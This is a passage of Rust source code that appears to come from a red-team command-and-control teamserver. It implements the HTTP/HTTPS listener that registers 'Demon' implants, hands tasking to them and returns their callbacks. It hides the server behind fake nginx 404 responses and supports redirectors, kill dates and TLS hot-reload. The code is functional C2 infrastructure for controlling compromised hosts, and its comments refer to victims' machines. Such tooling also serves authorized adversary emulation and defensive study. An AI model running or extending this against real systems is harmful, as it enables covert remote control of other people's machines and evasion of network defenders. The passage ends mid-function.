//! HTTP/HTTPS C2 listener runtime.

use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, SystemTime};

use axum::Router;
use axum::body::{Body, Bytes};
use axum::extract::{ConnectInfo, State};
use axum::http::{HeaderMap, HeaderName, HeaderValue, Method, Request, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::any;
use axum_server::tls_rustls::RustlsConfig;
use red_cell_common::HttpListenerConfig;
use red_cell_common::demon::{DEMON_MAGIC_VALUE, DemonCommand, DemonEnvelope, DemonHeader};
use red_cell_common::tls::{
    TlsKeyAlgorithm, install_default_crypto_provider, load_tls_identity, resolve_tls_identity,
    validate_tls_not_expired,
};
use std::collections::HashMap;
use tokio::net::TcpListener;
use tokio::sync::RwLock;
use tokio::task::JoinHandle;
use tracing::{debug, info, warn};

use red_cell_common::HttpListenerResponseConfig;

use crate::{
    AgentRegistry, AuditResultStatus, CommandDispatchError, CommandDispatcher, Database,
    DemonInitSecretConfig, DemonPacketParser, DemonParserError, ParsedDemonPacket, PluginRuntime,
    ShutdownController, SocketRelayManager, TeamserverError,
    agent_events::{agent_new_event, agent_reregistered_event},
    audit_details, build_init_ack, build_reconnect_ack,
    dispatch::DownloadTracker,
    events::EventBus,
    parameter_object, record_operator_action,
};

use super::{
    DEMON_INIT_WINDOW_DURATION, DemonInitRateLimiter, ListenerManagerError, ListenerRuntimeFuture,
    MAX_DEMON_INIT_ATTEMPTS_PER_IP, MAX_RECONNECT_PROBES_PER_AGENT,
    RECONNECT_PROBE_WINDOW_DURATION, ReconnectProbeRateLimiter, UnknownCallbackProbeAuditLimiter,
};

use crate::MAX_AGENT_MESSAGE_LEN;

const DEFAULT_FAKE_404_BODY: &str =
    "<html><head><title>404 Not Found</title></head><body>404 Not Found</body></html>";
const DEFAULT_HTTP_METHOD: &str = "POST";
const MINIMUM_DEMON_CALLBACK_BYTES: usize = DemonHeader::SERIALIZED_LEN + 8;
const HEADER_VALIDATION_IGNORES: [&str; 2] = ["connection", "accept-encoding"];

// ── Types ────────────────────────────────────────────────────────────────────

#[derive(Clone, Debug)]
pub(super) struct HttpListenerState {
    config: HttpListenerConfig,
    trusted_proxy_peers: Vec<TrustedProxyPeer>,
    registry: AgentRegistry,
    database: Database,
    parser: DemonPacketParser,
    events: EventBus,
    dispatcher: CommandDispatcher,
    demon_init_rate_limiter: DemonInitRateLimiter,
    unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    method: Method,
    required_headers: Vec<ExpectedHeader>,
    response_headers: Vec<(HeaderName, HeaderValue)>,
    response_body: Arc<[u8]>,
    default_fake_404_body: Arc<[u8]>,
    shutdown: ShutdownController,
}

#[derive(Clone, Debug)]
struct ExpectedHeader {
    name: HeaderName,
    expected_value: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum TrustedProxyPeer {
    Address(IpAddr),
    Network(TrustedProxyNetwork),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct TrustedProxyNetwork {
    network: IpAddr,
    prefix_len: u8,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct ProcessedDemonResponse {
    pub(crate) agent_id: u32,
    pub(crate) payload: Vec<u8>,
    pub(crate) http_disposition: DemonHttpDisposition,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum DemonTransportKind {
    Init,
    Reconnect,
    Callback,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum DemonHttpDisposition {
    Ok,
    Fake404,
    TooManyRequests,
}

// ── HttpListenerState ────────────────────────────────────────────────────────

impl HttpListenerState {
    #[allow(clippy::too_many_arguments)]
    fn build(
        config: &HttpListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
        demon_init_rate_limiter: DemonInitRateLimiter,
        unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
        reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
        shutdown: ShutdownController,
        init_secret_config: DemonInitSecretConfig,
        max_pivot_chain_depth: usize,
        allow_legacy_ctr: bool,
    ) -> Result<Self, ListenerManagerError> {
        let method = parse_method(config)?;
        let trusted_proxy_peers = config
            .trusted_proxy_peers
            .iter()
            .map(|value| parse_trusted_proxy_peer(value, &config.name))
            .collect::<Result<Vec<_>, _>>()?;
        let required_headers = config
            .headers
            .iter()
            .filter_map(|header| parse_expected_header(header, &config.name).transpose())
            .collect::<Result<Vec<_>, _>>()?;
        let response_headers = config
            .response
            .as_ref()
            .map_or(Ok(Vec::new()), |response| parse_response_headers(response, &config.name))?;
        let response_body = config
            .response
            .as_ref()
            .and_then(|response| response.body.as_deref())
            .unwrap_or_default()
            .as_bytes()
            .to_vec()
            .into();

        Ok(Self {
            config: config.clone(),
            trusted_proxy_peers,
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::with_init_secret_config(
                registry.clone(),
                init_secret_config,
            )
            .with_allow_legacy_ctr(allow_legacy_ctr),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_downloads(
                registry.clone(),
                events.clone(),
                database.clone(),
                sockets,
                plugins,
                downloads,
                max_pivot_chain_depth,
                allow_legacy_ctr,
            ),
            events,
            demon_init_rate_limiter,
            unknown_callback_probe_audit_limiter,
            reconnect_probe_rate_limiter,
            method,
            required_headers,
            response_headers,
            response_body,
            default_fake_404_body: DEFAULT_FAKE_404_BODY.as_bytes().to_vec().into(),
            shutdown,
        })
    }

    fn fake_404_response(&self) -> Response {
        let body = if self.response_body.is_empty() {
            self.default_fake_404_body.clone()
        } else {
            self.response_body.clone()
        };

        let mut response =
            build_response(StatusCode::NOT_FOUND, body.as_ref(), &self.response_headers);
        let headers = response.headers_mut();
        set_default_header(headers, "server", "nginx");
        set_default_header(headers, "content-type", "text/html");
        response
    }

    fn callback_empty_response(&self) -> Response {
        build_response(StatusCode::OK, &[], &self.response_headers)
    }

    fn callback_bytes_response(&self, body: &[u8]) -> Response {
        build_response(StatusCode::OK, body, &self.response_headers)
    }
}

impl TrustedProxyNetwork {
    fn contains(&self, ip: IpAddr) -> bool {
        match (self.network, ip) {
            (IpAddr::V4(network), IpAddr::V4(ip)) => {
                let mask = prefix_mask_u32(self.prefix_len);
                (u32::from(network) & mask) == (u32::from(ip) & mask)
            }
            (IpAddr::V6(network), IpAddr::V6(ip)) => {
                let mask = prefix_mask_u128(self.prefix_len);
                (u128::from(network) & mask) == (u128::from(ip) & mask)
            }
            _ => false,
        }
    }
}

// ── Spawn / TLS ──────────────────────────────────────────────────────────────

#[allow(clippy::too_many_arguments)]
pub(super) async fn spawn_http_listener_runtime(
    config: &HttpListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    downloads: DownloadTracker,
    demon_init_rate_limiter: DemonInitRateLimiter,
    unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    shutdown: ShutdownController,
    max_pivot_chain_depth: usize,
    init_secret_config: DemonInitSecretConfig,
    allow_legacy_ctr: bool,
    tls_configs: Arc<RwLock<HashMap<String, RustlsConfig>>>,
    watcher_handles: Arc<RwLock<HashMap<String, JoinHandle<()>>>>,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    let state = Arc::new(HttpListenerState::build(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        downloads,
        demon_init_rate_limiter,
        unknown_callback_probe_audit_limiter,
        reconnect_probe_rate_limiter,
        shutdown,
        init_secret_config,
        max_pivot_chain_depth,
        allow_legacy_ctr,
    )?);
    let address = format!("{}:{}", config.host_bind, config.port_bind);
    let listener = TcpListener::bind(address.as_str()).await.map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind {address}: {error}"),
        }
    })?;
    let std_listener = listener.into_std().map_err(|error| ListenerManagerError::StartFailed {
        name: config.name.clone(),
        message: format!("failed to convert bound socket {address} into std listener: {error}"),
    })?;
    let router = Router::new().fallback(any(http_listener_handler)).with_state(state.clone());

    if config.secure {
        install_default_crypto_provider();
        let tls_config = build_http_tls_config(config).await?;

        // Register the live config handle so hot-reload can reach it later.
        tls_configs.write().await.insert(config.name.clone(), tls_config.clone());

        // If the cert comes from files, spawn a poller that hot-reloads on change.
        if let Some(cert_cfg) = &config.cert {
            let handle = spawn_cert_file_watcher(
                config.name.clone(),
                PathBuf::from(&cert_cfg.cert),
                PathBuf::from(&cert_cfg.key),
                tls_config.clone(),
            );
            watcher_handles.write().await.insert(config.name.clone(), handle);
        }

        let server = axum_server::from_tcp_rustls(std_listener, tls_config).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTPS listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<SocketAddr>())
                .await
                .map_err(|error| format!("https listener `{listener_name}` exited: {error}"))
        }))
    } else {
        let server = axum_server::from_tcp(std_listener).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTP listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<SocketAddr>())
                .await
                .map_err(|error| format!("http listener `{listener_name}` exited: {error}"))
        }))
    }
}

/// Spawn a background task that polls a certificate file for changes and hot-reloads it.
///
/// The task checks the cert file's modification time every 30 seconds.  When a change
/// is detected it reads both files, validates the new cert, and calls
/// [`RustlsConfig::reload_from_pem`].  Failed reloads are logged as warnings and
/// the watcher continues running so the next successful write is picked up.
///
/// The returned [`JoinHandle`] should be aborted when the listener stops.
pub(crate) fn spawn_cert_file_watcher(
    listener_name: String,
    cert_path: PathBuf,
    key_path: PathBuf,
    tls_config: RustlsConfig,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        /// Poll interval for modification-time checks.
        const POLL_INTERVAL: Duration = Duration::from_secs(30);

        let mut interval = tokio::time::interval(POLL_INTERVAL);
        // Skip the first (immediate) tick so we don't reload on startup.
        interval.tick().await;

        let mut last_cert_mtime = cert_mtime(&cert_path);
        let mut last_key_mtime = cert_mtime(&key_path);

        loop {
            interval.tick().await;

            let cur_cert_mtime = cert_mtime(&cert_path);
            let cur_key_mtime = cert_mtime(&key_path);
            if cur_cert_mtime == last_cert_mtime && cur_key_mtime == last_key_mtime {
                continue;
            }

            match reload_tls_from_files(&cert_path, &key_path, &tls_config).await {
                Ok(()) => {
                    info!(
                        listener = %listener_name,
                        cert = %cert_path.display(),
                        key = %key_path.display(),
                        "TLS certificate/key auto-reloaded from file"
                    );
                    last_cert_mtime = cur_cert_mtime;
                    last_key_mtime = cur_key_mtime;
                }
                Err(message) => {
                    warn!(
                        listener = %listener_name,
                        cert = %cert_path.display(),
                        key = %key_path.display(),
                        error = %message,
                        "TLS certificate/key auto-reload failed; retaining previous certificate"
                    );
                }
            }
        }
    })
}

/// Read the modification time of a file, returning `None` on any error.
pub(crate) fn cert_mtime(path: &std::path::Path) -> Option<SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// Read cert + key from files, validate, and hot-reload into `tls_config`.
pub(crate) async fn reload_tls_from_files(
    cert_path: &std::path::Path,
    key_path: &std::path::Path,
    tls_config: &RustlsConfig,
) -> Result<(), String> {
    let cert_pem = tokio::fs::read(cert_path)
        .await
        .map_err(|e| format!("read {}: {e}", cert_path.display()))?;
    let key_pem =
        tokio::fs::read(key_path).await.map_err(|e| format!("read {}: {e}", key_path.display()))?;

    load_tls_identity(&cert_pem, &key_pem).map_err(|e| e.to_string())?;
    validate_tls_not_expired(&cert_pem).map_err(|e| e.to_string())?;

    tls_config.reload_from_pem(cert_pem, key_pem).await.map_err(|e| e.to_string())
}

pub(super) async fn build_http_tls_config(
    config: &HttpListenerConfig,
) -> Result<RustlsConfig, ListenerManagerError> {
    let subject_alt_names = http_listener_subject_alt_names(config);
    let cert_config =
        config.cert.as_ref().map(|cert| red_cell_common::config::HttpListenerCertConfig {
            cert: cert.cert.clone(),
            key: cert.key.clone(),
        });
    let identity =
        resolve_tls_identity(&subject_alt_names, cert_config.as_ref(), TlsKeyAlgorithm::EcdsaP256)
            .map_err(|error| ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to resolve TLS identity: {error}"),
            })?;

    RustlsConfig::from_pem(identity.certificate_pem().to_vec(), identity.private_key_pem().to_vec())
        .await
        .map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to build rustls configuration: {error}"),
        })
}

pub(crate) fn http_listener_subject_alt_names(config: &HttpListenerConfig) -> Vec<String> {
    let mut names = Vec::new();

    for value in config
        .hosts
        .iter()
        .chain(std::iter::once(&config.host_bind))
        .chain(config.host_header.iter())
    {
        let trimmed = value.trim();
        if trimmed.is_empty() || names.iter().any(|entry| entry == trimmed) {
            continue;
        }

        names.push(trimmed.to_owned());
        if trimmed.parse::<IpAddr>().is_ok_and(|address| address.is_unspecified()) {
            if !names.iter().any(|entry| entry == "127.0.0.1") {
                names.push("127.0.0.1".to_owned());
            }
            if !names.iter().any(|entry| entry == "localhost") {
                names.push("localhost".to_owned());
            }
        }
    }

    if names.is_empty() {
        names.push("127.0.0.1".to_owned());
    }

    names
}

// ── Demon transport processing ───────────────────────────────────────────────

async fn build_callback_response(
    dispatcher: &CommandDispatcher,
    agent_id: u32,
    packages: &[crate::DemonCallbackPackage],
) -> Result<Vec<u8>, ListenerManagerError> {
    dispatcher.dispatch_packages(agent_id, packages).await.map_err(map_command_dispatch_error)
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn process_demon_transport(
    listener_name: &str,
    registry: &AgentRegistry,
    database: &Database,
    parser: &DemonPacketParser,
    events: &EventBus,
    dispatcher: &CommandDispatcher,
    unknown_callback_probe_audit_limiter: &UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: &ReconnectProbeRateLimiter,
    demon_init_rate_limiter: &DemonInitRateLimiter,
    body: &[u8],
    external_ip: String,
) -> Result<ProcessedDemonResponse, ListenerManagerError> {
    match parser.parse_for_listener(body, external_ip.as_str(), listener_name).await {
        Ok(ParsedDemonPacket::Init(init)) => {
            let response =
                build_init_ack(registry, init.agent.agent_id).await.map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!("failed to build demon init ack: {error}"),
                    }
                })?;

            let pivots = registry.pivots(init.agent.agent_id).await;
            events.broadcast(agent_new_event(
                listener_name,
                init.header.magic,
                &init.agent,
                &pivots,
            ));
            let agent_id = init.agent.agent_id;
            let external_ip_for_audit = external_ip.clone();
            let listener_name_for_audit = listener_name.to_owned();
            if let Err(error) = record_operator_action(
                database,
                "teamserver",
                "agent.registered",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Success,
                    Some(agent_id),
                    Some("registered"),
                    Some(parameter_object([
                        ("listener", serde_json::Value::String(listener_name_for_audit)),
                        ("external_ip", serde_json::Value::String(external_ip_for_audit)),
                    ])),
                ),
            )
            .await
            {
                warn!(
                    listener = listener_name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "failed to persist agent.registered audit entry"
                );
            }
            if let Ok(Some(plugins)) = PluginRuntime::current() {
                if let Err(error) = plugins.emit_agent_registered(agent_id).await {
                    tracing::warn!(
                        agent_id = format_args!("{agent_id:08X}"),
                        %error,
                        "failed to emit python agent_registered event"
                    );
                }
            }
            Ok(ProcessedDemonResponse {
                agent_id,
                payload: response,
                http_disposition: DemonHttpDisposition::Ok,
            })
        }
        Ok(ParsedDemonPacket::ReInit(init)) => {
            let response =
                build_init_ack(registry, init.agent.agent_id).await.map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!(
                            "failed to build demon init ack for re-registration: {error}"
                        ),
                    }
                })?;

            let pivots = registry.pivots(init.agent.agent_id).await;
            events.broadcast(agent_reregistered_event(
                listener_name,
                init.header.magic,
                &init.agent,
                &pivots,
            ));
            let agent_id = init.agent.agent_id;
            let external_ip_for_audit = external_ip.clone();
            let listener_name_for_audit = listener_name.to_owned();
            if let Err(error) = record_operator_action(
                database,
                "teamserver",
                "agent.reregistered",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Success,
                    Some(agent_id),
                    Some("reregistered"),
                    Some(parameter_object([
                        ("listener", serde_json::Value::String(listener_name_for_audit)),
                        ("external_ip", serde_json::Value::String(external_ip_for_audit)),
                    ])),
                ),
            )
            .await
            {
                warn!(
                    listener = listener_name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "failed to persist agent.reregistered audit entry"
                );
            }
            if let Ok(Some(plugins)) = PluginRuntime::current() {
                if let Err(error) = plugins.emit_agent_registered(agent_id).await {
                    tracing::warn!(
                        agent_id = format_args!("{agent_id:08X}"),
                        %error,
                        "failed to emit python agent_registered event for re-registration"
                    );
                }
            }
            Ok(ProcessedDemonResponse {
                agent_id,
                payload: response,
                http_disposition: DemonHttpDisposition::Ok,
            })
        }
        Ok(ParsedDemonPacket::Reconnect { header, .. }) => {
            let agent_known = registry.get(header.agent_id).await.is_some();

            if agent_known {
                if !reconnect_probe_rate_limiter.allow(header.agent_id).await {
                    warn!(
                        listener = listener_name,
                        agent_id = format_args!("{:08X}", header.agent_id),
                        external_ip,
                        max_probes = MAX_RECONNECT_PROBES_PER_AGENT,
                        window_seconds = RECONNECT_PROBE_WINDOW_DURATION.as_secs(),
                        "reconnect probe rate limit exceeded — possible probe spam"
                    );
                    return Ok(ProcessedDemonResponse {
                        agent_id: header.agent_id,
                        payload: Vec::new(),
                        http_disposition: DemonHttpDisposition::TooManyRequests,
                    });
                }

                let payload =
                    build_reconnect_ack(registry, header.agent_id).await.map_err(|error| {
                        ListenerManagerError::InvalidConfig {
                            message: format!("failed to build reconnect ack: {error}"),
                        }
                    })?;
                Ok(ProcessedDemonResponse {
                    agent_id: header.agent_id,
                    payload,
                    http_disposition: DemonHttpDisposition::Ok,
                })
            } else {
                let ip: IpAddr =
                    external_ip.parse().unwrap_or(IpAddr::V4(std::net::Ipv4Addr::UNSPECIFIED));
                if !demon_init_rate_limiter.allow(ip).await {
                    warn!(
                        listener = listener_name,
                        agent_id = format_args!("{:08X}", header.agent_id),
                        external_ip,
                        "unknown-agent reconnect probe rejected by per-IP rate limiter"
                    );
                    return Ok(ProcessedDemonResponse {
                        agent_id: header.agent_id,
                        payload: Vec::new(),
                        http_disposition: DemonHttpDisposition::Fake404,
                    });
                }

                if unknown_callback_probe_audit_limiter.allow(listener_name, &external_ip).await {
                    warn!(
                        listener = listener_name,
                        agent_id = format_args!("{:08X}", header.agent_id),
                        external_ip,
                        "unknown agent sent reconnect probe"
                    );
                    record_unknown_reconnect_probe(
                        database,
                        listener_name,
                        header.agent_id,
                        &external_ip,
                    )
                    .await;
                } else {
                    debug!(
                        listener = listener_name,
                        agent_id = format_args!("{:08X}", header.agent_id),
                        external_ip,
                        "suppressing unknown reconnect probe audit row after per-source limit"
                    );
                }
                Ok(ProcessedDemonResponse {
                    agent_id: header.agent_id,
                    payload: Vec::new(),
                    http_disposition: DemonHttpDisposition::Fake404,
                })
            }
        }
        Ok(ParsedDemonPacket::Callback { header, packages }) => {
            let payload = build_callback_response(dispatcher, header.agent_id, &packages).await?;

            Ok(ProcessedDemonResponse {
                agent_id: header.agent_id,
                payload,
                http_disposition: DemonHttpDisposition::Ok,
            })
        }
        Err(DemonParserError::Registry(TeamserverError::AgentNotFound { agent_id })) => {
            if unknown_callback_probe_audit_limiter.allow(listener_name, &external_ip).await {
                warn!(
                    listener = listener_name,
                    agent_id = format_args!("{:08X}", agent_id),
                    external_ip,
                    "unknown agent sent callback probe"
                );
                record_unknown_callback_probe(database, listener_name, agent_id, &external_ip)
                    .await;
            } else {
                debug!(
                    listener = listener_name,
                    agent_id = format_args!("{:08X}", agent_id),
                    external_ip,
                    "suppressing unknown callback probe audit row after per-source limit"
                );
            }
            Ok(ProcessedDemonResponse {
                agent_id,
                payload: Vec::new(),
                http_disposition: DemonHttpDisposition::Fake404,
            })
        }
        Err(error) => Err(ListenerManagerError::InvalidConfig {
            message: format!("failed to parse demon callback: {error}"),
        }),
    }
}

async fn record_unknown_reconnect_probe(
    database: &Database,
    listener_name: &str,
    agent_id: u32,
    external_ip: &str,
) {
    let details = audit_details(
        AuditResultStatus::Failure,
        Some(agent_id),
        Some("reconnect_probe"),
        Some(parameter_object([
            ("listener", serde_json::Value::String(listener_name.to_owned())),
            ("external_ip", serde_json::Value::String(external_ip.to_owned())),
        ])),
    );

    if let Err(error) = record_operator_action(
        database,
        "teamserver",
        "agent.reconnect_probe",
        "agent",
        Some(format!("{agent_id:08X}")),
        details,
    )
    .await
    {
        warn!(
            listener = listener_name,
            agent_id = format_args!("{agent_id:08X}"),
            %error,
            "failed to persist unknown reconnect probe audit entry"
        );
    }
}

async fn record_unknown_callback_probe(
    database: &Database,
    listener_name: &str,
    agent_id: u32,
    external_ip: &str,
) {
    let details = audit_details(
        AuditResultStatus::Failure,
        Some(agent_id),
        Some("callback_probe"),
        Some(parameter_object([
            ("listener", serde_json::Value::String(listener_name.to_owned())),
            ("external_ip", serde_json::Value::String(external_ip.to_owned())),
        ])),
    );

    if let Err(error) = record_operator_action(
        database,
        "teamserver",
        "agent.callback_probe",
        "agent",
        Some(format!("{agent_id:08X}")),
        details,
    )
    .await
    {
        warn!(
            listener = listener_name,
            agent_id = format_args!("{agent_id:08X}"),
            %error,
            "failed to persist unknown callback probe audit entry"
        );
    }
}

pub(crate) fn map_command_dispatch_error(error: CommandDispatchError) -> ListenerManagerError {
    ListenerManagerError::InvalidConfig { message: error.to_string() }
}

pub(crate) fn classify_demon_transport(body: &[u8]) -> Option<DemonTransportKind> {
    let envelope = DemonEnvelope::from_bytes(body).ok()?;
    if envelope.payload.len() < 8 {
        return None;
    }

    let command_id = u32::from_be_bytes(envelope.payload[0..4].try_into().ok()?);
    if command_id != u32::from(DemonCommand::DemonInit) {
        return Some(DemonTransportKind::Callback);
    }

    let remaining = &envelope.payload[8..];
    if remaining.is_empty() {
        Some(DemonTransportKind::Reconnect)
    } else {
        Some(DemonTransportKind::Init)
    }
}

pub(crate) async fn allow_demon_init_for_ip(
    listener_name: &str,
    rate_limiter: &DemonInitRateLimiter,
    client_ip: IpAddr,
    body: &[u8],
) -> bool {
    if classify_demon_transport(body) != Some(DemonTransportKind::Init) {
        return true;
    }

    if rate_limiter.allow(client_ip).await {
        return true;
    }

    warn!(
        listener = listener_name,
        client_ip = %client_ip,
        max_attempts = MAX_DEMON_INIT_ATTEMPTS_PER_IP,
        window_seconds = DEMON_INIT_WINDOW_DURATION.as_secs(),
        "rejecting DEMON_INIT because the per-IP rate limit was exceeded"
    );
    false
}

// ── HTTP handler ─────────────────────────────────────────────────────────────

/// Buffers an HTTP request body while performing an early pre-screen on the
/// Demon transport magic value.
///
/// The Demon magic value (`0xDEADBEEF`) occupies bytes 4–7 of every valid
/// Demon packet. Buffering the full body before checking the magic allows
/// an adversary to force the server to allocate up to `MAX_AGENT_MESSAGE_LEN`
/// (30 MiB) per connection before rejection. This function rejects bodies
/// that fail the magic check as soon as 8 bytes have been accumulated, which
/// limits per-connection allocation to a single network chunk (~16 KiB in
/// practice) for obviously non-Demon traffic.
///
/// Returns `None` if the body exceeds `max_len`, contains a read error, or
/// does not carry the correct Demon magic value.
pub(crate) async fn collect_body_with_magic_precheck(body: Body, max_len: usize) -> Option<Bytes> {
    use http_body_util::BodyExt as _;

    let mut body = body;
    let mut buf: Vec<u8> = Vec::new();
    let mut magic_checked = false;

    while let Some(frame) = body.frame().await {
        let frame = frame.ok()?;
        let Ok(data) = frame.into_data() else {
            // Trailers and other non-data frames are skipped.
            continue;
        };
        if buf.len() + data.len() > max_len {
            return None;
        }
        buf.extend_from_slice(&data);
        // As soon as we have the 8 bytes that cover the magic field (bytes 4–7),
        // validate the magic and drop the connection immediately on mismatch.
        if !magic_checked && buf.len() >= 8 {
            if buf[4..8] != DEMON_MAGIC_VALUE.to_be_bytes() {
                return None;
            }
            magic_checked = true;
        }
    }

    // Bodies shorter than 8 bytes cannot pass the magic check.
    if !magic_checked {
        return None;
    }

    Some(Bytes::from(buf))
}

async fn http_listener_handler(
    State(state): State<Arc<HttpListenerState>>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    request: Request<Body>,
) -> Response {
    if !http_request_matches(&state, &request) {
        return state.fake_404_response();
    }

    // Reject traffic when the listener's kill_date has passed.
    if is_past_kill_date(state.config.kill_date.as_deref()) {
        debug!(listener = %state.config.name, "rejecting request — kill_date has passed");
        return state.fake_404_response();
    }

    // NOTE: WorkingHours enforcement is intentionally NOT done server-side.
    // In the Demon protocol, working hours are encoded into the payload and
    // enforced by the agent using the victim host's local clock.  Gating here
    // with the server's UTC clock would reject valid callbacks whenever the
    // server and target timezones differ.

    let external_ip = extract_external_ip(
        state.config.behind_redirector,
        &state.trusted_proxy_peers,
        peer,
        &request,
    );
    let (_, body) = request.into_parts();
    let Some(body) = collect_body_with_magic_precheck(body, MAX_AGENT_MESSAGE_LEN).await else {
        return state.fake_404_response();
    };

    if !is_valid_demon_callback_request(&body) {
        return state.fake_404_response();
    }

    let Some(_callback_guard) = state.shutdown.try_track_callback() else {
        return state.fake_404_response();
    };

    if !allow_demon_init_for_ip(
        &state.config.name,
        &state.demon_init_rate_limiter,
        external_ip,
        body.as_ref(),
    )
    .await
    {
        return state.fake_404_response();
    }

    match process_demon_transport(
        &state.config.name,
        &state.registry,
        &state.database,
        &state.parser,
        &state.events,
        &state.dispatcher,
        &state.unknown_callback_probe_audit_limiter,
        &state.reconnect_probe_rate_limiter,
        &state.demon_init_rate_limiter,
        &body,
        external_ip.to_string(),
    )
    .await
    {
        Ok(response) if response.http_disposition == DemonHttpDisposition::TooManyRequests => {
            StatusCode::TOO_MANY_REQUESTS.into_response()
        }
        Ok(response) if response.http_disposition == DemonHttpDisposition::Fake404 => {
            state.fake_404_response()
        }
        Ok(response) if response.payload.is_empty() => state.callback_empty_response(),
        Ok(response) => state.callback_bytes_response(&response.payload),
        Err(error) => {
            warn!(listener = %state.config.name, %error, "failed to process demon callback");
            state.fake_404_response()
        }
    }
}

// ── Request matching ─────────────────────────────────────────────────────────

fn http_request_matches(state: &HttpListenerState, request: &Request<Body>) -> bool {
    request.method() == state.method
        && uri_matches(&state.config, request)
        && user_agent_matches(&state.config, request.headers())
        && headers_match(&state.required_headers, request.headers())
}

fn uri_matches(config: &HttpListenerConfig, request: &Request<Body>) -> bool {
    if config.uris.is_empty() || (config.uris.len() == 1 && config.uris[0].is_empty()) {
        return true;
    }

    let request_uri = request
        .uri()
        .path_and_query()
        .map_or_else(|| request.uri().path(), axum::http::uri::PathAndQuery::as_str);

    config.uris.iter().any(|uri| uri == request_uri)
}

fn user_agent_matches(config: &HttpListenerConfig, headers: &HeaderMap) -> bool {
    match config.user_agent.as_deref() {
        Some(expected) => {
            headers.get(axum::http::header::USER_AGENT).and_then(|value| value.to_str().ok())
                == Some(expected)
        }
        None => true,
    }
}

fn headers_match(expected_headers: &[ExpectedHeader], headers: &HeaderMap) -> bool {
    expected_headers.iter().all(|expected| {
        headers
            .get(&expected.name)
            .and_then(|value| value.to_str().ok())
            .is_some_and(|actual| actual.eq_ignore_ascii_case(&expected.expected_value))
    })
}

/// Return `true` when `kill_date` is set and the current wall-clock time has
/// passed it.  The value is parsed through [`red_cell_common::parse_kill_date_to_epoch`],
/// which accepts both a plain unix timestamp and `YYYY-MM-DD HH:MM:SS` (UTC).
///
/// If the value is absent or empty, returns `false` (no kill-date set).
/// If the value is present but malformed, logs a warning and returns `true`
/// (fail-closed: reject traffic rather than silently disabling enforcement).
pub(crate) fn is_past_kill_date(kill_date: Option<&str>) -> bool {
    let Some(value) = kill_date.map(str::trim).filter(|v| !v.is_empty()) else {
        return false;
    };
    let timestamp = match red_cell_common::parse_kill_date_to_epoch(value) {
        Ok(ts) => ts,
        Err(err) => {
            tracing::warn!(%err, "malformed kill_date — treating as expired (fail-closed)");
            return true;
        }
    };
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let Ok(kill_epoch) = u64::try_from(timestamp) else {
        // Negative timestamps are always in the past.
        return true;
    };
    now >= kill_epoch
}

// ── IP extraction / trusted proxy ────────────────────────────────────────────

pub(crate) fn extract_external_ip(
    behind_redirector: bool,
    trusted_proxy_peers: &[TrustedProxyPeer],
    peer: SocketAddr,
    request: &Request<Body>,
) -> IpAddr {
    if behind_redirector && peer_is_trusted_proxy(peer.ip(), trusted_proxy_peers) {
        if let Some(ip) = request
            .headers()
            .get("x-forwarded-for")
            .and_then(|value| value.to_str().ok())
            .and_then(|value| forwarded_for_client_ip(value, trusted_proxy_peers))
        {
            return ip;
        }

        if let Some(ip) = request
            .headers()
            .get("x-real-ip")
            .and_then(|value| value.to_str().ok())
            .map(str::trim)
            .and_then(|value| value.parse::<IpAddr>().ok())
        {
            return ip;
        }
    }

    peer.ip()
}

fn forwarded_for_client_ip(
    value: &str,
    trusted_proxy_peers: &[TrustedProxyPeer],
) -> Option<IpAddr> {
    let hops = value
        .split(',')
        .map(str::trim)
        .map(|hop| (!hop.is_empty()).then_some(hop))
        .collect::<Option<Vec<_>>>()?;
    if hops.is_empty() {
        return None;
    }

    let hops =
